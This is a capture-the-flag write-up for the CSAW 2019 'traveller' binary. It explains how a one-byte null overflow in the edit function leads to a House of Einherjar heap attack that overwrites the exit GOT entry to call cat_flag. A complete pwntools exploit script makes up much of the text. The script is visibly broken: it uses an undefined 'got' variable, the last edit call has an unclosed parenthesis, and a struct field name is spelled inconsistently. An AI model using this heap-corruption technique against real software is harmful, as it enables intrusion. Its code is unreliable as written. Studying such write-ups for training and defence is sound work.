# CSAW Quals 2019 TRAVELLER Writeup

Let's start by checking the mitigations enabled using GDB.

```sh
$checksec
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


So basically most of the protections are disabled.
This challenge is a just like other menu driven challenges, with options to add, edit, delete and view chunks.


##### Add 

- We can add chunk of the size from given five options. The program allocates a struct :
```sh
    struct trip{
        int disatance;
        char * destination;
    };
```
- Then it allocates the size, read data into it and copy the address to a table in bss and updates tIndex.
- We can only have 7 chunks at a time.

##### Change

- We can select any trip and update the data in it.
- Size is taken from the structure.

##### Delete

- Takes a struct and copy it into a temp variable.
- It takes the address of last chunk in the table and copies it to the position of the struct we are deleting in the table.
- The program then frees the struct and the destination chunk.

##### getTrip

- Just print out the data in destination of selected struct.

We also have a ***cat_flag*** function.

## Bug

The bug is in the change funtion :

```c
1    if ( tIndex > choice )
2  {
3    oldTrip = trips[choice];
4    bytes_read = read(0, oldTrip->destination, oldTrip->distance);
5    oldTrip->destination[bytes_read] = 0;
6  }
  
 ```
 As you can see in the 5th line, program copies a null to end of the data. Which means if we fill the entire buffer, we can get a ***one-byte*** overflow.
 So this is a ***House of Einherjar*** bug.
 
 First we have to figure out a way to get two adjescent destination chunks so that we can utilize the bug.
 
 Here's what we can do :
 
 - Create 2 large chunks.
 - Free the first one.
 - Create a small chunk so as to almost fill the freed chunk's space.
 
When next allocation happens, the struct will go to the previous freed space and the destination chunk will be created from top chunk. Here we get two destination chunks close to one another.

```py
add(2,'a'*0x80)
add(3,'b'*0x80)
free(0)
add(1,"c"*50)
```

Now we can overwrite the flag bit of last chunk by editing the chunk above it.

Before we free the chunk, we need the free to pass all the checks. We have to create fake chunks so that next chunk and next next chunk of the chunk to be freed are valid. Also we need to coalesce a chunk whose fd and bk are set.

For this we use the remaining space from the first freed chunk.

```py
next_chunk="d"*(0x200-18)+p64(0)+p64(0x51)
add(5,next_chunk)
prev_chunk="1"*288+p64(0x1a0)
edit(0,prev_chunk)
next_next_chunk="2"*46+p64(0)+p64(0x51)
add(1,next_next_chunk)
```
We have a struct which is currently allocated but also overlaps with a small_bin chunk.

Now we just need to allocate one more chunk and give the destination in a way it overwrites the destination address of the struct which was overlapped. We overwrite it with a GOT address.

Since RELRO is partial, we can just overwrite some GOT address with the cat_flag function.

Here GOT of exit is overwritten. Exit is called when the number of chunks is equal to 7. Thus create enough chunks and cat_flag will be called giving us the flag.

Exploit :

```py
from pwn import *
#io=remote("pwn.chal.csaw.io",1003)
io=process("./traveller",env = {"LD_PRELOAD" : "./libc-2.23.so"})
io.recvuntil("Welcome to trip management system. \n")
def add(choice,payload):
   io.send('1'.ljust(4," "))
   io.send(str(choice).ljust(4," "))
   if(choice==1):
       size=0x80
   elif(choice==2):
       size=0x110
   elif(choice==3):
       size=0x128
   elif(choice==4):
       size=0x150
   elif(choice==5):
       size=0x200
   io.send(payload.ljust(size," "))

def free(index):
   io.send('3'.ljust(4," "))
   io.send(str(index).ljust(0x14," "))
def edit(choice,payload):
   io.send('2'.ljust(4," "))
   io.sendline(str(choice).ljust(0x14," "))
   io.sendline(payload)
def view(index):
   io.send('4'.ljust(4," "))
   io.sendlineafter("view? \n",str(index))

#Creating two chunks

add(2,'a'*0x80) 
add(3,'b'*0x80)

#Freeing the 0th chunk
free(0)
io.sendline()

#Almost filling the free space
add(1,"c"*50)
io.sendline()

#Chunk to get adjascent to another chunk and also creating a next_chunk
next_chunk="d"*(0x200-18)+p64(0)+p64(0x51)
add(5,next_chunk)

#Overwriting the flag bit of the chunk and setting the prev_size
prev_chunk="1"*288+p64(0x1a0)
io.sendline()
edit(0,prev_chunk)

#Setting next_next_chunk to pass all the checks
next_next_chunk="2"*46+p64(0)+p64(0x51)
io.sendline()
add(1,next_next_chunk)
io.sendline()

#Freeing chunk to get an overlapping chunk
free(2)


#Overwriting the destination with exit_got
exit_got=0x0000000000602078
cat_flag=0x00000000004008b6
overwrite_destination="5"*62+p64(0x50)+p64(0x20)+p64(got)+p64(7)
io.sendline()
add(3,overwrite_destination)
io.sendline()

#Changing exit_got to cat_flag
edit(0,p64(cat_flag)
io.interactive()
```
 

